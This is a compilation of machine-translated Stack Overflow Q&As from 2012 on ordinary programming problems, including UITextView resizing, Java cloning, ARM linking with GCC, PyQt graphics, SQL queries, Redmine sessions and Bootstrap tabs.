# iphone - 在我输入时更改 UITextView 的框架

> ID：12213363
> 
> 赞同：1
> 
> 时间：2012-08-31T10:18:36.800
> 
> 标签：iphone, ios, xcode, uitextview

我可以使用下面的代码来设置 textView 框架的大小，以在我按下按钮或诸如此类时大致匹配 textView 的内容（键入的文本）。每当输入一个新字符时，我将如何调用它，以便框架会交互地增长或缩小？

```
- (IBAction)doneEditingText:(id)sender {
    [myTextView resignFirstResponder];
    [myTextView setFrame:CGRectMake(myTextView.frame.origin.x, myTextView.frame.origin.y, myTextView.contentSize.width, myTextView.contentSize.height)];
} 
```

谢谢阅读

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T10:29:41.853

**编辑**：

在 .h 文件中实现 UITextView 委托：

```
@interface ViewController : UIViewController<UITextViewDelegate> 
```

如果 yourTextView 从 xib 添加，则将委托与文件所有者绑定，否则在 ViewDidLoad 添加此行：

```
yourTextView.delegate = self; 
```

* * *

根据您的要求使用 textView 的委托：

```
- (BOOL)textView:(UITextView *)textView shouldChangeTextInRange:(NSRange)range replacementText:(NSString *)text
{
   CGSize maximumSize = CGSizeMake(280,999); //specify width of textView  and maximum height for text to fit in width of textView
   CGSize txtSize = [textView.text sizeWithFont:[UIFont fontWithName:@"Arial" size:16] constrainedToSize:maximumSize lineBreakMode:UILineBreakModeCharacterWrap]; //calulate size of text by specifying font here
   //Add UIViewAnimation here if needed
   [textView setFrame:CGRectMake(textView.frame.origin.x,textView.frame.origin.y,txtSize.width+10,txtSize.height+10)]; // change accordingly
   return YES;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-31T15:06:02.200

我刚刚完成了这个。当前（发布此答案时）接受的答案的问题是委托方法：

**- (BOOL)textView:(UITextView *)textView shouldChangeTextInRange:(NSRange)range replacementText:(NSString *)text**

在提交用户键入/插入/删除的更改之前公开 textView。因此，您将要实现的调整大小将晚一个字符。UITextView 确实从 UIScrollView 继承，因此文本不会从屏幕上剪掉，但可能会导致一些尴尬的行为。

我的解决方案是使用两个委托方法来正确实现调整大小的效果。

**在用户键入的字符到达屏幕之前展开 UITextView：**

```
- (BOOL)textView:(UITextView *)textView shouldChangeTextInRange:(NSRange)range replacementText:(NSString *)text
{
NSMutableString *tempString = [NSMutableString stringWithString:textView.text];

[tempString replaceCharactersInRange:range withString:text];

//If we are adding to the length of the string (We might need to expand)
if([tempString length]>textView.text.length)
{
    //Create a temporaryTextView which has all of the characteristics of your original textView
    UITextView *tempTextView = [[UITextView alloc] initWithFrame:CGRectZero];
    tempTextView.font = _inputFont;
    tempTextView.contentInset = textView.contentInset;
    [tempTextView setText:tempString];

    //Change this to respect whatever width constraint you are trying to achieve.
    CGSize theSize = [tempTextView sizeThatFits:CGSizeMake(192, CGFLOAT_MAX)];

    if(theSize.height!=textView.frame.size.height)
    {

        textView.frame = CGRectMake(115, 310, 192,theSize.height);

        return YES;
    }
    else
    {
        return YES;
    }

}
else
{
    return YES;
}
} 
```

**并在用户删除/缩小 UITextView 中的文本量后缩小字符**

```
-(void)textViewDidChange:(UITextView *)textView
{
//We enter this method AFTER the edit has been drawn to the screen, therefore check to see if we should shrink.
if([textView sizeThatFits:CGSizeMake(192, CGFLOAT_MAX)].height!=textView.frame.size.height)
{
    //change this to reflect the constraints of your UITextView
    textView.frame = CGRectMake(115, 310, 192,[textView sizeThatFits:CGSizeMake(192, CGFLOAT_MAX)].height);

}
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-31T10:24:47.153

您可以在 GIT 上使用类似这个 repo 的东西，它具有您想要的几乎相同的功能-

[https://github.com/HansPinckaers/GrowingTextView](https://github.com/HansPinckaers/GrowingTextView) 它类似于 iPhone 中的消息应用程序。

# java - 在子类中实现 clone()

> ID：12213369
> 
> 赞同：4
> 
> 时间：2012-08-31T10:18:48.080
> 
> 标签：java, inheritance, clone

我有两个类：父类 A 和一些子类 B，它扩展了 A 并且比 A 多了几个字段。我希望能够克隆这两个类，所以我已经覆盖了类中的`clone()`方法`Object`。

由于 B 类基本上是具有一些额外字段的 A 类，因此我想在`clone()`B 类的实现中使用 A 类的克隆。我尝试了以下内容：

```
 public class A
    {
      public Object clone()
      {
        A cloneA = new A();
        cloneA.foo = this.foo;
        cloneA.bar = this.bar;
        return cloneA;
      }
    }

    public class B extends B
    {
      public Object clone()
      {
        Object cloneA = super.clone();
        B cloneB = (B)cloneA;
        cloneB.fieldSpecificForB = this.fieldSpecificForB;
        return cloneB;
      }
    } 
```

这样我就不必`clone()`在 B 的`clone()`方法中复制 A 方法中的所有克隆逻辑。不幸的是，这不起作用，因为Java不允许将A类的对象强制转换为B类的对象。我四处寻找有关如何执行此操作的答案，但似乎没有办法重用克隆逻辑A.这是否意味着每次在A中添加另一个字段时，我都必须手动将这个字段的复制添加到*所有*`clone()`子类的方法中。这似乎很容易出错......

 ** * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T10:22:50.727

工作方式`clone`是，它会自动为您复制*所有字段*。但是，您必须要求`super.clone()`它起作用：

```
public class A implements Cloneable  // add 'implements'
{
  public Object clone()
  {
    A cloneA = super.clone(); // this copies all fields and returns something of *the same type* as 'this'...
    return cloneA;
  }
}

public class B extends A //supposed to extend 'A' right?
{
  public Object clone()
  {
    Object cloneA = super.clone(); // this returns object of runtime type B
    B cloneB = (B)cloneA; // will work
    return cloneB;
  }
} 
```

编辑：实际上你的`clone`方法现在什么都不做，所以它相当于写：

```
public class A implements Cloneable  //add 'implements'
{

}

public class B extends A //supposed to extend 'A' right?
{

} 
```

这`implements Cloneable`部分是做伎俩的部分。另请参阅可[克隆](http://docs.oracle.com/javase/7/docs/api/java/lang/Cloneable.html)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T10:20:56.247

问题是您的`A#clone()`. 您永远不应该`clone`通过 using 创建您将在方法中返回的实例`new`，而是始终通过调用来创建`super.clone()`，这正是为了避免您现在遇到的错误。

因此，将您的 A 类调整为

```
public class A
{
  @Override
  protected Object clone() throws CloneNotSupportedException
  {
    A cloneA = (A)super.clone();
    cloneA.foo = this.foo;
    cloneA.bar = this.bar;
    return cloneA;
  }
} 
```*

# gcc - 将 RVCT 库与 GCC 链接

> ID：12213372
> 
> 赞同：2
> 
> 时间：2012-08-31T10:18:57.040
> 
> 标签：gcc, linker, arm, static-linking

`RVCT 2.2`我正在尝试链接使用编译的测试程序编译的静态第三方库`GCC`（arm-none-linux-gnueabi-gcc Sourcery G++ Lite 2011.03-41）。

如果我与 链接`-static`，一切正常。但是，如果我不使用`-static`，我会收到很多类似以下的投诉：

```
foolib.a(foo.o): In function `foofunc':
foo.c:(.text+0x4c8): undefined reference to `__aeabi_memcpy'
foolib.a(bar.o): In function `barfunc':
bar.c:(.text+0xa54): undefined reference to `__aeabi_memclr4' 
```

两者`memcpy`和`memset`都应该存在于 libc 中。显然`GCC`，如果我使用`-static`. 有人可以解释发生了什么吗？我假设除非我添加标志，`GCC`否则动态链接到 libc ，但不应该在共享 libc 库中定义类似的内容吗？`-static``__aeabi_memcpy`

编辑：
为了让人们自己测试，我现在创建了一个简约的测试用例，如下所示：

```
//foo.c
#include <string.h>

void foo(void *dst, void *src, int num) {
    memcpy(dst, src, num);
} 
```

该文件使用 RVCT 2.2 编译和存档，如下所示：

```
armcc.exe --arm -c --apcs=/noswst/interwork foo.c -o foo.o
armar.exe --create foo.a foo.o 
```

然后将该库与以下测试程序链接：

```
//bar.c
#include <stdio.h>
extern void foo(void *dst, void *src, int num);
int main(int argc, char *argv[]) {
    int a[10], b[10], i;

    for (i = 0; i < 10; i++) {
            a[i] = i;
    }

    foo(b, a, sizeof(a));

    for (i = 0; i < 10; i++) {
            if (a[i] != b[i]) {
                    printf("Diff at %d: %d != %d\n", i, a[i], b[i]);
                    return 1;
            }
    }
    printf("Success!\n");
    return 0;
} 
```

使用以下命令：

```
arm-none-linux-gnueabi-gcc -Wall bar.c foo.a -o bar 
```

这给出了以下输出（除非`-static`也使用）：

```
foo.a(foo.o): In function `foo':
foo.c:(.text+0x0): undefined reference to `__aeabi_memcpy'
arm-none-linux-gnueabi/bin/ld: bar: hidden symbol `__aeabi_memcpy' isn't defined
arm-none-linux-gnueabi/bin/ld: final link failed: Nonrepresentable section on output
collect2: ld returned 1 exit status 
```

如果您没有 RVCT，可以从[http://dl.dropbox.com/u/14498565/foo.a下载二进制 foo.a。](http://dl.dropbox.com/u/14498565/foo.a)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-05T00:46:26.277

在与@Leo 相处一段时间后，我想我明白发生了什么。似乎 foo.o 的编译方式需要*静态*链接到`__aeabi_memcpy`. 看着 foo.o `arm-none-linux-gnueabi-objdump -t`，我看到了这个：

```
foo.o:     file format elf32-littlearm

SYMBOL TABLE:
00000000 l    df *ABS*  00000000 foo.c
00000000 l    d  .text  00000000 .text
00000000 l       *ABS*  00000000 BuildAttributes$$THUMB_ISAv1$ARM_ISAv4$M$PE$A:L22$X:L11$S22$IEEE1$IW$USESV6$~STKCKD$USESV7$~SHL$OSPACE$EBA8$REQ8$PRES8$EABIv2
00000000 l     O .debug_frame$$$.text   00000000 C$debug_frame$$$.text7
00000000  w    F *UND*  00000000 .hidden Lib$$Request$$armlib
00000000       F *UND*  00000000 .hidden __aeabi_memcpy
00000000 g     F .text  00000004 .hidden foo 
```

请注意`-t`命令行中的...这是为了向我们展示静态符号（非共享）。在 foo.o 上运行`arm-none-linux-gnueabi-objdump -T`显示：

```
foo.o:     file format elf32-littlearm

/home/jszakmeister/.local/sourcery-arm-gnueabi/bin/arm-none-linux-gnueabi-objdump: foo.o: not a dynamic object
DYNAMIC SYMBOL TABLE:
no symbols 
```

所以`__aeabi_memcpy`希望通过静态链接解决，这就是使用`-static`工作的原因。我相信如果您编译 foo.oa 的方式稍有不同，以便它需要一个共享的 C 库，那么您可以在不指定 -static 的情况下链接到 foo.a。不幸的是，我不熟悉 RVCT 编译器，或者我会告诉你怎么做。

FWIW，使用`strace`我能够看到它确实链接到共享 C 库，但没有解析链接。我还使用`--sysroot=/path/to/code/sourcery/toolchain/arm-none-linux-gnueabi/libc`命令行选项来确保它找到了正确的 C 库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:53:03.700

这些是运行时 ABI 定义的辅助函数：http: [//infocenter.arm.com/help/topic/com.arm.doc.ihi0043c/IHI0043C_rtabi.pdf](http://infocenter.arm.com/help/topic/com.arm.doc.ihi0043c/IHI0043C_rtabi.pdf)

解决此问题的方法可能是实现您自己的版本（使用 libc memcpy 和 memset），但也可能是这里发生了更微妙的链接问题，可能会进一步绊倒您。很难说没有访问目标文件。

# gwt - 如何获取在 gwt celltable 中单击的图像的位置

> ID：12213374
> 
> 赞同：2
> 
> 时间：2012-08-31T10:19:08.157
> 
> 标签：gwt, celltable

我正在使用 gwt 单元格表来显示搜索结果..我有两列显示与搜索相关的文本，我有一个带有箭头图像的列，当我单击它时，我应该能够打开一个对话框并将其放在单击的图像旁边。在列上单击我能够显示一个对话框，但我无法找到一种方法来确定所单击图像的确切位置，以便我可以将其放置在它旁边。预期的功能与发生的情况有些相似当我们将鼠标悬停在谷歌搜索页面上的箭头上时......请帮助......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-23T09:30:22.943

你只需要这样做。但是，它仅适用于 textCell。我想您知道如何将此示例用于您的案例。

```
column.setFieldUpdater(new FieldUpdater<Type, String>() {                   
                @Override
                public void update(int index, Type object, String value) {
                    int x = cellTable.getRowElement(index).getCells().getItem(columnNumber).getAbsoluteLeft();
                    int y = cellTable.getRowElement(index).getCells().getItem(columnNumber).getAbsoluteTop();
                    popupPanel.setPopupPosition(x, y);
                    popupPanel.show();
                }
            }); 
```

# java - Android网络服务asp .asmx

> ID：12213378
> 
> 赞同：1
> 
> 时间：2012-08-31T10:19:13.673
> 
> 标签：java, android, android-service, ksoap2

我尝试通过 ksoap2 连接 Android - webservice。我有个问题。当我在 Java 中运行控制台应用程序时，它运行正常。但是当我将此代码复制到 Android 时，它会出现错误：

> “Java.Net.UnknowHostException.jeryservice.somee.com”。

我的代码：

```
String NAMESPACE = "http://jeryservice.somee.com/";
String URL = "http://jeryservice.somee.com/myservice/Service1.asmx";
String SOAP_ACTION = "http://jeryservice.somee.com/test";
SoapObject request= null;
String rs="";
request=new SoapObject(NAMESPACE,"test");
SoapSerializationEnvelope envelope=new SoapSerializationEnvelope(SoapEnvelope.VER11);
envelope.dotNet=true;
request.addProperty("name", " Jery ok man");
envelope.setOutputSoapObject(request);
HttpTransportSE transp=null;
transp=new HttpTransportSE(URL);
try {
  transp.call(SOAP_ACTION, envelope);
  Object rsl=envelope.getResponse();
  rs=rsl.toString();
  Toast.makeText(getApplicationContext(),"ok-> "+ rs, Toast.LENGTH_SHORT).show();
  catch(Exception ex) {
    Toast.makeText(getApplicationContext(), "error->"+ ex.toString(), Toast.LENGTH_SHORT).show();
    ex.printStackTrace();
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:27:03.017

```
<uses-permission android:name="android.permission.INTERNET" /> 
```

# mysql - 如何从数据库中读取哪些股票已买入但尚未卖出？

> ID：12213379
> 
> 赞同：3
> 
> 时间：2012-08-31T10:19:17.253
> 
> 标签：mysql, sql

考虑下表 ( `portfolio`)。它是股票市场投资者的交易日志。每天，他要么`buy`s、`sell`s 或`hold`s（之前购买的股票尚未出售）股票（由 标识`sp100_id`）：

```
_date       sp100_id  action  price
-----------------------------------
2011-03-21  11        buy     10.50
2011-03-21  55        buy     60.00
2011-03-21  99        buy      5.15
2011-03-22  11        sell     9.80
2011-03-22  55        sell    61.50
2011-03-22  99        hold     5.60
2011-03-23   1        buy     95.00
2011-03-23   2        buy     25.60
2011-03-23  99        hold
2011-03-24   1        sell    96.00
2011-03-24   2        hold
2011-03-24  99        hold
2011-03-25  11        buy      8.90
2011-03-25   2        sell    28.00
2011-03-25  99        hold 
```

日志停止在`2011-03-25`。对于`2011-03-26`，我想知道： - 投资组合中还剩下哪些股票 - 最初购买这些股票的价格和日期

如果我们手动执行此操作： - 股票`11`是在 买入`2011-03-21`，卖出`2011-03-22`，但又在 买入`2011-3-25`，`8.90`从那以后我们没有卖出它，所以它仍然在投资组合中`2011-03-26` - 股票`55`在买入`2011-03-21`和卖出，`2011-03-22`所以不再在投资组合中 -股票`99`是买入的`2011-03-21`，我们一直持有，从未卖出，所以它仍然在投资组合中`2011-03-26`，价格为`5.15` - 股票`1`，`2`之前买入和卖出`2011-03-26`

所以投资组合`2011-03-26`包括：

```
sp100_id  buy_date    buy_price
-------------------------------
11        2011-03-25  8.90
99        2011-03-21  5.15 
```

我的问题是：通过什么查询可以从表中返回上述输出？

[SQLFiddle在这里](http://www.sqlfiddle.com/#!2/77186)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:29:04.557

```
select t1.sp100_id, t1._date as buy_date, t1.price
from (select * from portfolio where action='buy')  t1
    left join (select * from portfolio where action='sell') t2 
      on t1.sp100_id=t2.sp100_id
    and t1._date<t2._date
where t2.sp100_id is null 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T10:44:19.043

这是一个[sqlfiddle 演示](http://www.sqlfiddle.com/#!2/77186/24)

```
select t0.* from portfolio t0
join
(
select sp100_id,max(_date) mdate from portfolio t
   where action = 'buy'
      and 
        not exists (select sp100_id from portfolio t2
                     where t2.sp100_id=t.sp100_id
                           and t2._date>t._date
                           and t2.action='sell')
group by sp100_id
) t1 on (t0.sp100_id=t1.sp100_id) and (t0._date=t1.mdate) 
```

# java - 安卓开关/机箱

> ID：12213383
> 
> 赞同：1
> 
> 时间：2012-08-31T10:19:34.023
> 
> 标签：java, android, switch-statement, case

我有这个开关/案例结构：

```
public void onClick(View arg0) {

    // TODO Auto-generated method stub
    switch(arg0.getId()){

        case R.id.save:

            if (et.getText() !=null && thumbnail != null){

                 TableRow tr = new TableRow(this);
                 ImageView view = new ImageView(this);
                 TextView view2 = new TextView(this);
                 Button view3 = new Button(this);
                 view3.setOnClickListener(this);

                 titulo = new String[500];
                 mensaje = new String[500];
                 fotos = new Bitmap[500];

                 view3.setId(i);

                 view.setImageBitmap(thumbnail);
                 view.setPadding(1, 5, 0, 0);
                 view.setScaleType(ImageView.ScaleType.CENTER_INSIDE);

                 Calendar c = Calendar.getInstance();
                 SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd");

                 titulo[i]=""+et.getText();
                 mensaje[i]=""+et1.getText();
                 fotos[i]=thumbnail;
                 i++;

                 view2.setText("" + et.getText()  + dateFormat.format(c.getTime()) );
                 view2.setGravity(Gravity.CENTER_HORIZONTAL);
                 view2.setGravity(Gravity.CENTER_VERTICAL);

                 view3.setGravity(Gravity.RIGHT);
                 view3.setGravity(Gravity.CENTER_VERTICAL);

                 DisplayMetrics metrics = new DisplayMetrics();
                 getWindowManager().getDefaultDisplay().getMetrics(metrics);

                 tr.addView(view, metrics.widthPixels/3, 150);
                 tr.addView(view2, metrics.widthPixels/2, 100);
                 tr.addView(view3, metrics.widthPixels/6, 20);
                 tl.addView (tr, 0);

                 final Toast toastMensaje = Toast.makeText(getApplicationContext(),
                            "Tu entrada se cargó correctamente", Toast.LENGTH_LONG);
                    toastMensaje.setGravity(Gravity.CENTER, 0, 0);
                    toastMensaje.show();

                    et.setText("");
                    et1.setText("");
                    i1.setVisibility(View.GONE);

            }

            else{

                final Toast toastMensaje = Toast.makeText(getApplicationContext(),
                        "Tienes que añadir un título y una foto", Toast.LENGTH_LONG);
                toastMensaje.setGravity(Gravity.CENTER, 0, 0);
                toastMensaje.show();

            }

        break;

        case R.id.photo:

            Intent cameraIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);  
            startActivityForResult(cameraIntent, CAMERA_PIC_REQUEST);

        break;

        case R.id.gallery:

            Intent intent = new Intent(Intent.ACTION_PICK, android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
             startActivityForResult(intent, TFRequestCodes);

        break;

        case 0:

        final Toast toastMensaje = Toast.makeText(getApplicationContext(),
                   titulo[0], Toast.LENGTH_LONG);
            toastMensaje.setGravity(Gravity.CENTER, 0, 0);
            toastMensaje.show();

            break;

    }

} 
```

它工作正常，但我必须重复从 0 到取决于 array.lenght 的大量数字的代码

有没有办法减少所有这些代码？

也许是一个 for 循环，我已经尝试过了，但我无法让它工作。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:28:23.640

您可以将您的`case 0`和以下内容替换为：

```
 default:
        if (arg0.getId() < titulo.lenth) {
            final Toast toastMensaje = getToast(arg0.getId());
            toastMensaje.setGravity(Gravity.CENTER, 0, 0);
            toastMensaje.show();
        } else {
            //not a valid value
        }
        break;
}

private Toast getToast(int i) {
    return Toast.makeText(getApplicationContext(), titulo[i], Toast.LENGTH_LONG);
} 
```

# installation - 自动编辑 LabVIEW 调色板集

> ID：12213386
> 
> 赞同：1
> 
> 时间：2012-08-31T10:19:56.707
> 
> 标签：installation, labview, palette

我有一个要安装到 user.lib 文件夹的设备驱动程序，驱动程序中包含各种 .mnu 文件。安装驱动程序后，我需要去

工具->高级->编辑调色板集...

并从 mnu 文件创建一个新的子调色板。

有可能自动化吗？我宁愿用户可以简单地安装驱动程序，并且他们的调色板已经得到照顾。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T19:17:43.763

有一个应用程序方法 App.Palettes.Refresh 可以刷新当前的调色板集。您可以创建一个在安装期间正在执行的 VI： ![应用调色板刷新](../Images/76d841f91552d62a913a55a1c2df6c89.png)

当然你的 mnu 文件应该在 vi.lib、instr.lib 或 user.lib 下

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-05T17:41:31.967

如果您使用[VIPM](http://jki.net)（VI 包管理器），您可以使用它们的界面来布置功能托盘。然后安装包将相应地放置VI。

VIPM 标配 LV2012，因此大多数人将开始使用它在 LabVIEW 市场上分发他们的插件。

# ruby-on-rails - 在 Windows 上使用“thin”进行 Redmine：会话在实例之间共享

> ID：12213389
> 
> 赞同：0
> 
> 时间：2012-08-31T10:20:16.943
> 
> 标签：ruby-on-rails, redmine, thin

我正在尝试在 Windows 2008 上使用 Thin 设置两个 redmine 2.0.3 实例。

我开始瘦了

```
D:\redmine1>thin start -e production -p 3005 --prefix /redmine/instance1
D:\redmine2>thin start -e production -p 3006 --prefix /redmine/instance2 
```

启动实例。当我登录到一个实例**时，我会使用相同的用户名自动登录到另一个实例**。会话cookie '_redmine_session' 中的会话是相同的（因为cookie 指向'/'）。

这是一个薄问题还是 redmine 问题？configuration.yml 中的秘密令牌是不同的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T11:52:49.203

事实证明，我已经复制了目录并通过重新生成了令牌

```
rake generate_secret_token 
```

但这并没有覆盖生成的文件“secret.rb”。我不得不手动删除该文件。甚至没有错误消息，所以我为此打开了一张 redmine 票。

[门票：#11866](http://www.redmine.org/issues/11866)

# ruby-on-rails - 乘客：未定义符号 rb_intern2

> ID：12213390
> 
> 赞同：1
> 
> 时间：2012-08-31T10:20:29.097
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, rubygems, passenger

我在 Apache 网络服务器上安装了 Passanger mod 并尝试运行我的应用程序（一个使用`Rails 3.2.8`和`Ruby 1.9.3-p194`）。

首先，我遇到了“*`bundler`找不到宝石”之*类的错误。搜索了一下我找到了一个解决方案 - 我只需要将`GEM_PATH`环境变量添加到我的虚拟主机。

但后来我遇到了另一个问题：几乎每个 gem 都会抛出这样的异常（*Apache 错误日志*）：

```
Rack: /home/shybovycha/projects/rails/blog: symbol lookup error: /usr/local/lib/ruby/gems/1.9.1/gems/json-1.7.5/lib/json/ext/parser.so: undefined symbol: rb_intern2
*** Exception EOFError in spawn manager (Unexpected end-of-file detected.) (process 31821):
        from /usr/lib/ruby/1.8/phusion_passenger/utils.rb:306:in `unmarshal_and_raise_errors'
        from /usr/lib/ruby/1.8/phusion_passenger/rack/application_spawner.rb:71:in `spawn_application'
        from /usr/lib/ruby/1.8/phusion_passenger/rack/application_spawner.rb:41:in `spawn_application'
        from /usr/lib/ruby/1.8/phusion_passenger/spawn_manager.rb:159:in `spawn_application'
        from /usr/lib/ruby/1.8/phusion_passenger/spawn_manager.rb:287:in `handle_spawn_application'
        from /usr/lib/ruby/1.8/phusion_passenger/abstract_server.rb:352:in `__send__'
        from /usr/lib/ruby/1.8/phusion_passenger/abstract_server.rb:352:in `main_loop'
        from /usr/lib/ruby/1.8/phusion_passenger/abstract_server.rb:196:in `start_synchronously'
        from /usr/lib/phusion_passenger/passenger-spawn-server:61
[ pid=31752 file=ext/apache2/Hooks.cpp:727 time=2012-08-31 12:51:47.973 ]:
  Unexpected error in mod_passenger: Cannot spawn application '/home/shybovycha/projects/rails/blog': The spawn server has exited unexpectedly.
  Backtrace:
     (empty) 
```

尝试重新安装 gems，有和没有`--platform`选项给我什么。

**注意：** `rails server`完美进行。

请帮我解决这个问题！

# python - Python PyQt：如何用鼠标在窗口上移动我的小部件？

> ID：12213391
> 
> 赞同：3
> 
> 时间：2012-08-31T10:20:33.163
> 
> 标签：python, pyqt4

我是 Python 新手。我用固定坐标绘制了多边形和圆。现在我想使用鼠标将这个多边形和圆圈移动到窗口上的其他位置。请指导我该怎么做？

```
import sys
from PyQt4.QtGui import *
from PyQt4.QtCore import *

class MyFrame(QWidget):
    def __init__(self, parent=None):
            QWidget.__init__(self)

    def paintEvent(self, event=None):
            paint=QPainter(self)
            paint.setPen(QPen(QColor(Qt.green).dark(150),1,Qt.SolidLine))
            segColor=QColor(Qt.green).dark(150)
            paint.setBrush(segColor)
            paint.setBrushOrigin(QPoint(225,225))
            polygon=QPolygon([QPoint(250,175), QPoint(265,175), QPoint(250,190), QPoint(265,190),QPoint(250,175)])
            paint.drawPolygon(polygon)
            paint.setPen(QPen(QColor(Qt.red),1,Qt.SolidLine))
            paint.setBrush(QBrush(Qt.NoBrush))
            polygon1=QPolygon([QPoint(250,300), QPoint(250,500), QPoint(350,500), QPoint(350,300)])
            paint.drawPolyline(polygon1)
            paint.drawEllipse(50,50,50,50)

app=QApplication(sys.argv)
f=MyFrame()
f.show()
app.exec_() 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T17:00:40.497

您应该查看 QGraphicsView 而不是您在做什么，它已经内置了这一切。

[http://doc.qt.nokia.com/4.7-snapshot/qgraphicsview.html](http://doc.qt.nokia.com/4.7-snapshot/qgraphicsview.html)

[http://doc.qt.nokia.com/4.7-snapshot/qgraphicsscene.html](http://doc.qt.nokia.com/4.7-snapshot/qgraphicsscene.html)

```
from PyQt4 import QtGui, QtCore

class MyFrame(QtGui.QGraphicsView):
    def __init__( self, parent = None ):
        super(MyFrame, self).__init__(parent)

        self.setScene(QtGui.QGraphicsScene())

        # add some items
        x = 0
        y = 0
        w = 45
        h = 45
        pen = QtGui.QPen(QtGui.QColor(QtCore.Qt.green))
        brush = QtGui.QBrush(pen.color().darker(150))

        item = self.scene().addEllipse(x, y, w, h, pen, brush)
        item.setFlag(QtGui.QGraphicsItem.ItemIsMovable)

if ( __name__ == '__main__' ):
    app = QtGui.QApplication([])
    f = MyFrame()
    f.show()
    app.exec_() 
```

**编辑：展示如何创建 QPainterPath**

```
from PyQt4 import QtGui, QtCore

class MyFrame(QtGui.QGraphicsView):
    def __init__( self, parent = None ):
        super(MyFrame, self).__init__(parent)

        scene = QtGui.QGraphicsScene()
        self.setScene(scene)

        # add some items
        x = 0
        y = 0
        w = 45
        h = 45
        pen   = QtGui.QPen(QtGui.QColor(QtCore.Qt.green))
        brush = QtGui.QBrush(pen.color().darker(150))

        item = scene.addEllipse(x, y, w, h, pen, brush)
        item.setFlag(QtGui.QGraphicsItem.ItemIsMovable)

        # create an open path
        path = QtGui.QPainterPath()
        path.moveTo(-w, -h)
        path.lineTo(-w, h)
        path.lineTo(w, h)
        path.lineTo(w, -h)

        clr   = QtGui.QColor('blue')
        clr.setAlpha(120)
        brush = QtGui.QBrush(clr)
        pen   = QtGui.QPen(QtCore.Qt.NoPen)
        fill_item = scene.addRect(-w, y, w*2, h, pen, brush)
        path_item = scene.addPath(path)

if ( __name__ == '__main__' ):
    app = QtGui.QApplication([])
    f = MyFrame()
    f.show()
    app.exec_() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-16T21:23:52.273

受 Eric 回答的启发，这里有一些代码通过更新点的 x 和 y 坐标来为点设置动画。

```
 from PyQt5.QtGui  import QPen, QBrush, QColor
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtWidgets import QGraphicsView, QGraphicsScene, QGraphicsItem, QApplication

class GameWindow(QGraphicsView):
    def __init__( self, parent = None ):
        super().__init__(parent)

        self.sx = 635
        self.sy = 475

        scene = QGraphicsScene(0,0,self.sx,self.sy)
        self.setScene(scene)

        self.x = 0
        self.y = 0
        self.w = 30
        self.h = 30
        pen   = QPen(QColor('dodgerblue'))
        #pen   = QPen(QColor(Qt.green))
        brush = QBrush(pen.color())
        #brush = QBrush(pen.color().darker(150))

        # As opposed to using QPen and QBrush, this colors the periphery only
        #dot = scene.addEllipse(self.x, self.y, self.w, self.h, QColor('dodgerblue')) 

        self.dot = scene.addEllipse(self.x, self.y, self.w, self.h, pen, brush)
        self.dot.setFlag(QGraphicsItem.ItemIsMovable)

if  __name__ == '__main__':
    import sys

    fps = 50
    refresh_period = 1000/fps # ms

    app = QApplication(sys.argv)

    gw = GameWindow()
    gw.resize(640,480)
    gw.show()

    # if the steps match the gw aspect ratio, the dot will move along the main diagonal,
    # otherwise the dot will drift
    xstep = 4
    ystep = 3
    #ystep = xstep * gw.sy / gw.sx

    def moveDot():
       # In place of the next four lines, one can have a function 
       # or a feed from an external source to update gw.x and gw.y
       gw.x += xstep
       gw.x %= gw.sx

       gw.y += ystep
       gw.y %= gw.sy

       gw.dot.setRect(gw.x,gw.y,gw.w,gw.h)

    timer = QTimer()
    timer.timeout.connect(moveDot)

    # Comment this line out to be able to click and drag the dot
    timer.start(refresh_period)

    sys.exit(app.exec_()) 
```

# asp.net-mvc - 引导导航选项卡不显示选项卡内容

> ID：12213392
> 
> 赞同：1
> 
> 时间：2012-08-31T10:20:35.723
> 
> 标签：asp.net-mvc, twitter-bootstrap

我正在循环传递给视图的对象（我正在使用 ASP.NET MVC 3）并使用 Bootstrap 创建一个导航选项卡。

目前，实际的 TABS 可以正常工作并渲染。但是**选项卡内容**不会显示 - 或者如果我将其设置为“活动”类，其中一个将显示当前选项卡内容（当我单击不同的选项卡时它不会改变）。

**我想要发生的事情：**单击一个选项卡-> 出现它的内容。

**当前发生**的情况：单击选项卡-> 除非我将选项卡内容的类更改为活动状态（如我之前提到的），否则不会显示任何内容。

下面是我的代码：

```
<div>
<ul class="nav nav-tabs">
    @for (int i = 0; i < 1; )
    {
        foreach (var cat in Model.MyObject)
        {
            if (i == 0)
            {
                <li class="active"><a href="#@cat.Name" data-toggle="tab">@cat.Name</a></li>
                i++;
            }
            else
            {
                <li><a href="#@cat.Name" data-toggle="tab">@cat.Name</a></li>
            }
        }
    }

</ul>
<div class="tab-content" style="overflow: visible;">
    @for (int i = 0; i < 1; )
    {
        foreach (var cat in Model.Model.MyObject)
        {
            if (i == 0)
            {
                <div class="tab-pane active" id="#@cat.Name">@cat.Name</div>
                i++;
            }
            else
            {
                <div class="tab-pane" id="#@cat.Name">@cat.Name</div>
            }
        }
    }
</div> 
```

我在每个 foreach 循环上放置了一个断点 - 有内容正在传递，所以这**不是**问题。

如何修改代码以便在我选择不同的选项卡时内容会发生变化？

